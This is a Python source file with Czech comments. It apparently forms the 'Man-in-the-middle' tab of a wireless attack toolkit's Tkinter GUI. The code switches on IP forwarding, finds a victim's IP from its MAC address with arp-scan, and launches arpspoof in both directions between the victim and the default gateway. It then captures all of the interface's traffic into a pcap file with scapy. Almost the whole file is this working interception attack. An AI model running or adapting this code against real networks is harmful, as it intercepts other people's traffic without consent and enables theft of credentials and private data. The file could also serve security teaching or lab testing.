import subprocess
from tkinter import ttk
from tkinter import *
from threading import Thread
import time
import signal
import os
from scapy.all import *
from src import global_names

# ========================================================================================================================
# Globální proměnná pro uchování reference na nekončící procesy pro jejich pozdější ukončení
arpspoof_cl_process = None
arpspoof_ap_process = None
capturing_process = None

output_traffic = "tmp/full_traffic.pcap"
capturing = True

# Uklidím případný soubor output po předešlém spuštění
if os.path.isfile(output_traffic):
    os.remove(output_traffic)

# ========================================================================================================================
# ========================================================================================================================
def start_forwarding():
    print("===== START FORWARDING TRAFFIC ====================")
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=1"
        print("COMMAND: " + command)

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"Přeposílání paketů bylo úspěšně zapnuto.")

        forwarding_on_button.configure(state=DISABLED) 
        forwarding_off_button.configure(state=NORMAL)
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání přeposílání paketů: {e}")
# ========================================================================================================================
def stop_forwarding():
    print("===== STOP FORWARDING TRAFFIC =====================")
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=0"
        print("COMMAND: " + command)

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"Přeposílání paketů bylo úspěšně vypnuto.")

        forwarding_off_button.configure(state=DISABLED) 
        forwarding_on_button.configure(state=NORMAL)
    except subprocess.CalledProcessError as e:

        print(f"Chyba při vypínání přeposílání paketů: {e}")
# ========================================================================================================================
def find_ip_by_mac(mac_address, interface):

    print("=== DEBUG: CL MAC: " + mac_address)
    print("=== DEBUG: Interface: " + interface)
    try:
        # Run arp-scan on the specified interface
        result = subprocess.check_output(['sudo', 'arp-scan', '--interface', interface, '--localnet'], text=True)
        
        # Iterate through each line of the output
        for line in result.splitlines():
            # Check if the current line contains the MAC address
            if mac_address.lower() in line.lower():
                # Extract and return the IP address
                ip_address = line.split()[0]
                return ip_address
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# ========================================================================================================================
def start_arp_spoofing(interface, cl):
    print("===== START ARP SPOOFING ==========================")
    try:
        interface = global_names.interface
        cl = global_names.cl

        print("=== DEBUG: Interface: " + interface)
        print("=== DEBUG: CL: " + cl)

        command = "ip route | grep default"
        print("COMMAND: " + command)
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid) 
        out = p.stdout.readline().decode()
        print(out)
        words = out.split()
        ap_ip = words[2]

        print("=== DEBUG: AP IP: " + ap_ip)
        
        client_ip = find_ip_by_mac(cl, interface)
        if not client_ip:
            print("ERROR při překladu client MAC na IP")
            return

        command = f"sudo arpspoof -i {interface} -t {client_ip} {ap_ip}"
        print("COMMAND: " + command)
        global arpspoof_cl_process 
        arpspoof_cl_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        command = f"sudo arpspoof -i {interface} -t {ap_ip} {client_ip}"
        print("COMMAND: " + command)
        global arpspoof_ap_process 
        arpspoof_ap_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        # Nastavuji správně tlačítka
        arp_spoofing_on_button.configure(state=DISABLED) 
        arp_spoofing_off_button.configure(state=NORMAL) 
        # Zapínám pohyb progress baru
        arp_spoofing_progress.grid(row=1,column=0,columnspan=3, sticky=EW, padx=5, pady=5)
        arp_spoofing_progress.start(10)

        print(f"ARP spoofing byl úspěšně spuštěn.")
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání ARP spoofingu: {e}")
# ========================================================================================================================
def stop_arp_spoofing():
    print("===== STOP ARP SPOOFING ===================================")
    global arpspoof_cl_process 
    global arpspoof_ap_process

    if arpspoof_cl_process:
        os.killpg(os.getpgid(arpspoof_cl_process.pid), signal.SIGTERM)
        print("  -- Process arpspoofing pro klienta byl zastaven.")

    if arpspoof_ap_process:
        os.killpg(os.getpgid(arpspoof_ap_process.pid), signal.SIGTERM)
        print("  -- Process arpspoofing pro access point byl zastaven.")

    # Zastavuji progress bar pro zachytavani handshaku
    global arp_spoofing_progress
    arp_spoofing_progress.stop()
    arp_spoofing_progress.grid_forget()

    global arp_spoofing_on_button
    global arp_spoofing_off_button
    arp_spoofing_on_button.configure(state=NORMAL) 
    arp_spoofing_off_button.configure(state=DISABLED) 
    
    print(f"ARP spoofing byl úspěšně zastaven.")

# ========================================================================================================================
def capture_packets(interface, output_traffic):
    #global output_traffic
    print("=== OUTPUT TRAFFIC FILE: " + output_traffic)
    t = AsyncSniffer(iface=interface, prn=lambda x: wrpcap(output_traffic, x, append=True))
    #t = AsyncSniffer(iface=interface, offline=output_traffic, prn=lambda x: wrpcap(output_traffic, x, append=True))
    
    global capturing
    #print(str(capturing))
    while capturing:
        t.start()
        time.sleep(1)
        t.stop()
# ========================================================================================================================
def start_capturing():
    print("===== START CAPTURING COMPLETE TRAFFIC =================================")
    try:
        # Zapne zachytávání všech paketů
        global output_traffic
        interface = global_names.interface

        #traffic_capture = pyshark.LiveCapture(interface='wlan0')
        #print("COMMAND: pyshark.FileCapture")
        #tohle do samostatnýho threadu:
                #traffic_capture = pyshark.FileCapture(interface=interface, output_file=output_traffic)    
        
        #command = f"tshark -i {interface} -w {output_traffic}"
        #print("COMMAND: " + command)

        #global capturing_process
        #capturing_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        global capturing
        capturing = True
        print("=== DEBUG: poustim thread capture_packets")
        th = Thread(target=lambda: capture_packets(interface, output_traffic), daemon=True)
        th.start()

        capturing_on_button.configure(state=DISABLED) 
        capturing_off_button.configure(state=NORMAL)
        capturing_label.configure(text="Datový provoz na rozhraní " + interface + "je zachycen do souboru " + output_traffic)
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání zachytávání paketů: {e}")
# ========================================================================================================================
def stop_capturing():
    print("===== STOP CAPTURING TRAFFIC ==============================")
    #global capturing_process
    global capturing
    capturing = False
    if capturing_process:
        os.killpg(os.getpgid(capturing_process.pid), signal.SIGTERM)
        print("  -- Process Zachytávání trafiku byl zastaven.")

    capturing_off_button.configure(state=DISABLED) 
    capturing_on_button.configure(state=NORMAL)

# ========================================================================================================================================
# Tab "Man-in-the-middle" ================================================================================================================
def draw_arp_spoof(frame, interface, cl):
    # Forwarding Frame ===============================================================================================================
    forwarding_frame = LabelFrame(frame, text="Přeposílání paketů", highlightthickness=4, borderwidth=4)
    forwarding_frame.pack(padx=10,pady=5, fill='x')

    global forwarding_on_button
    global forwarding_off_button
    forwarding_on_button = Button(forwarding_frame, text="Zapnout", width= 20, command=start_forwarding)
    forwarding_on_button.grid(row=0, column=0, padx=5, pady=5)

    forwarding_off_button = Button(forwarding_frame, text="Vypnout", width= 20, state=DISABLED, command=stop_forwarding)
    forwarding_off_button.grid(row=0, column=1, padx=5, pady=5)

    # ARP Spoof Frame ===============================================================================================================
    arp_spoofing_frame = LabelFrame(frame, text="ARP Spoofing", highlightthickness=4, borderwidth=4)
    arp_spoofing_frame.pack(padx=10,pady=5, fill='x')

    global arp_spoofing_on_button
    global arp_spoofing_off_button
    arp_spoofing_on_button = Button(arp_spoofing_frame, text="Zapnout", width= 20, command=lambda: start_arp_spoofing(global_names.interface, global_names.cl))
    arp_spoofing_on_button.grid(row=0, column=0, padx=5, pady=5)

    arp_spoofing_off_button = Button(arp_spoofing_frame, text="Vypnout", width= 20, state=DISABLED,command=stop_arp_spoofing)
    arp_spoofing_off_button.grid(row=0, column=1, padx=5, pady=5)

    global arp_spoofing_progress
    arp_spoofing_progress = ttk.Progressbar(arp_spoofing_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
    arp_spoofing_progress.step(0)

    arp_spoofing_frame.grid_columnconfigure(2, weight=1)
    # Capturing Frame ===============================================================================================================
    capturing_frame = LabelFrame(frame, text="Zachytávání paketů", highlightthickness=4, borderwidth=4)
    capturing_frame.pack(padx=10,pady=5, fill='x')

    global capturing_on_button
    global capturing_off_button
    #capturing_on_button = Button(capturing_frame, text="Zapnout", width= 20, command=lambda: start_capturing(interface, output_traffic))
    capturing_on_button = Button(capturing_frame, text="Zapnout", width= 20, command=start_capturing)
    capturing_on_button.grid(row=0, column=0, padx=5, pady=5, sticky=W)

    capturing_off_button = Button(capturing_frame, text="Vypnout", width= 20, state=DISABLED, command=stop_capturing)
    capturing_off_button.grid(row=0, column=1, padx=5, pady=5, sticky=W)
    
    global capturing_label
    capturing_label = Label(capturing_frame, text="")
    capturing_label.grid(row=1, column=0, columnspan=3, padx=5, pady=5)

    capturing_frame.grid_columnconfigure(2, weight=1)

